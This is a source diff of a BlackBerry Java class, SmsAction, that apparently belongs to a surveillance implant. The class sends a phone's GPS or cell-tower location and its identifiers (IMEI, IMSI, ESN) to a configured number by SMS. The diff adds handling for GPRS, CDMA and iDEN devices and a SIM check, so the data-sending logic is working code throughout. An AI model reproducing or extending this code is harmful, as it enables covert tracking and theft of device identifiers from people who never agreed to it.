@@ -16,8 +16,8 @@ import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
-import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
+import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
@@ -31,7 +31,6 @@ import blackberry.sms.SMSHelper;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
-
 
 /**
  * The Class SmsAction.
@@ -70,17 +69,17 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
         try {
             switch (type) {
-            case TYPE_TEXT:
-            case TYPE_SIM:
-                return sendSMS(text);
+                case TYPE_TEXT:
+                case TYPE_SIM:
+                    return sendSMS(text);
 
-            case TYPE_LOCATION:
-                // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-                if (!getGPSPosition()) {
-                    errorLocation();
-                }
+                case TYPE_LOCATION:
+                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+                    if (!getGPSPosition()) {
+                        errorLocation();
+                    }
 
-                break;
+                    break;
             }
             return true;
         } catch (final Exception ex) {
@@ -99,8 +98,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
         String message;
 
         try {
-            final boolean gprs = !Device.isCDMA();
-            if (gprs) {
+            if (Device.isGPRS()) {
                 // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
                 // CC e MNC possono essere estratti da IMEI
                 // http://en.wikipedia.org/wiki/Mobile_country_code
@@ -122,7 +120,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 mb.append(" LAC: " + lac);
                 mb.append(" CID: " + cid);
                 message = mb.toString();
-            } else {
+            } else if (Device.isCDMA()) {
                 final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
                 //CDMAInfo.getIMSI()
                 final int sid = cellinfo.getSID();
@@ -134,6 +132,16 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 mb.append(" NID: " + nid);
                 mb.append(" BID: " + bid);
                 message = mb.toString();
+            } else if (Device.isIDEN()) {
+                //#ifdef DEBUG
+                debug.error("getCellPosition: IDEN not supported");
+                //#endif
+                return false;
+            } else {
+                //#ifdef DEBUG
+                debug.trace("getCellPosition: not supported");
+                //#endif
+                return false;
             }
             //#ifdef DEBUG
             debug.info(message);
@@ -236,13 +244,13 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     boolean sendSMS(final String message) {
-        boolean ret = true;
+        boolean ret = false;
         if (Device.isCDMA()) {
             //#ifdef DEBUG
             debug.trace("sendSMS: Datagram");
             //#endif
             ret = SMSHelper.sendSMSDatagram(number, message);
-        } else {
+        } else if (Device.isGPRS()) {
             //#ifdef DEBUG
             //debug.trace("sendSMS: Binary");
             //#endif
@@ -251,7 +259,11 @@ public final class SmsAction extends SubAction implements LocationObserver {
             //#ifdef DEBUG
             //debug.trace("sendSMS: Text");
             //#endif
-            ret = SMSHelper.sendSMSText(number, message);
+            if (Device.isSimEnabled()) {
+                ret = SMSHelper.sendSMSText(number, message);
+            }
+        } else if (Device.isIDEN()) {
+            //TODO IDEN
         }
         return ret;
     }
@@ -276,36 +288,38 @@ public final class SmsAction extends SubAction implements LocationObserver {
             number = Utils.Unspace(WChar.getString(buffer, true));
 
             switch (type) {
-            case TYPE_TEXT:
-                len = databuffer.readInt();
-                buffer = new byte[len];
-                databuffer.read(buffer);
-                text = WChar.getString(buffer, true);
-                break;
-            case TYPE_LOCATION:
-                // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-                break;
-            case TYPE_SIM:
-                final StringBuffer sb = new StringBuffer();
-                final Device device = Device.getInstance();
-                if (Device.isCDMA()) {
+                case TYPE_TEXT:
+                    len = databuffer.readInt();
+                    buffer = new byte[len];
+                    databuffer.read(buffer);
+                    text = WChar.getString(buffer, true);
+                    break;
+                case TYPE_LOCATION:
+                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+                    break;
+                case TYPE_SIM:
+                    final StringBuffer sb = new StringBuffer();
+                    final Device device = Device.getInstance();
+                    if (Device.isCDMA()) {
 
-                    sb.append("SID: " + device.getSid() + "\n");
-                    sb.append("ESN: "
-                            + NumberUtilities.toString(device.getEsn(), 16)
-                            + "\n");
-                } else {
-                    sb.append("IMEI: " + device.getImei() + "\n");
-                    sb.append("IMSI: " + device.getImsi() + "\n");
-                }
+                        sb.append("SID: " + device.getSid() + "\n");
+                        sb.append("ESN: "
+                                + NumberUtilities.toString(device.getEsn(), 16)
+                                + "\n");
+                    } else if (Device.isGPRS()) {
+                        sb.append("IMEI: " + device.getImei() + "\n");
+                        sb.append("IMSI: " + device.getImsi() + "\n");
+                    } else if (Device.isIDEN()) {
+                        //TODO IDEN
+                    }
 
-                text = sb.toString();
-                break;
-            default:
-                //#ifdef DEBUG
-                debug.error("SmsAction.parse,  Unknown type: " + type);
-                //#endif
-                break;
+                    text = sb.toString();
+                    break;
+                default:
+                    //#ifdef DEBUG
+                    debug.error("SmsAction.parse,  Unknown type: " + type);
+                    //#endif
+                    break;
             }
 
         } catch (final EOFException e) {
